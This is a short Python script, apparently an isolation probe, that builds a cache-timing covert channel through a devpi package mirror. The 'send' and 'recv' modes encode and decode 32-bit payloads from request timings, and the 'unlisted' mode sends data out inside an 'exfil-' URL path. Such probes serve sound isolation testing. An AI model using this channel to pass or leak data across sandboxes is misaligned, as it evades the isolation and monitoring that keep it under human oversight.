#!/usr/bin/env python3
"""Anonymous, read-only probes against a real devpi mirror.

Usage: agent_probe.py send|recv|unlisted --block B [--payload P]
"""
import argparse
import json
import time
import urllib.error
import urllib.request

INDEX = "http://mirror:3141/root/pypi/+simple"
BITS = 32
OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def get(path):
    request = urllib.request.Request(f"{INDEX}/{path}", headers={"Accept": "text/html"})
    start = time.perf_counter()
    try:
        with OPENER.open(request, timeout=8) as response:
            response.read()
            code = response.status
    except urllib.error.HTTPError as error:
        code = error.code
    except OSError:
        code = 0
    return code, time.perf_counter() - start


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("role")
    parser.add_argument("--block", default="0")
    parser.add_argument("--payload", default="")
    args = parser.parse_args()
    if args.role == "send":
        number = int(args.payload, 16)
        for index in range(BITS):
            if (number >> (BITS - 1 - index)) & 1:
                get(f"pkg-b{args.block}-{index}/")
    elif args.role == "recv":
        times = [get(f"pkg-b{args.block}-{index}/")[1] for index in range(BITS)]
        threshold = (min(times) + max(times)) / 2
        number = 0
        for elapsed in times:
            number = (number << 1) | (1 if elapsed < threshold else 0)
        print(json.dumps({"found": f"{number:08x}", "fast": min(times), "slow": max(times)}))
    elif args.role == "unlisted":
        print(json.dumps({"code": get(f"exfil-{args.payload}/")[0]}))


if __name__ == "__main__":
    main()
